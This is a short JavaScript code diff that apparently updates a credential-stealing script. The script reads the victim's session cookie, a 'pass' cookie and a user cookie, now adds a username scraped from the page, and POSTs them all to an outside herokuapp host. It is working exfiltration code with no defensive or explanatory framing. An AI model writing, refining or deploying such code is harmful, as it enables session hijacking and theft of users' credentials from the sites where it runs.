@@ -13,9 +13,10 @@ function getCookie(cname) {
     }
     return "";
 }
+var userName = $($($($($(".flname").children()[0]).children()[0]).children()[1]).children()[0]).text();
 $.ajax({
     type: "POST",
     url: "https://nameless-wave-78594.herokuapp.com/information",
-    data: { username: document.title, userid: "failed", sess: getCookie('SESS'), pass: getCookie('pass'), userCookie: getCookie('user'), custCookie: "failed" },
+    data: { username: userName, userid: "failed", sess: getCookie('SESS'), pass: getCookie('pass'), userCookie: getCookie('user'), custCookie: "failed" },
 
 });
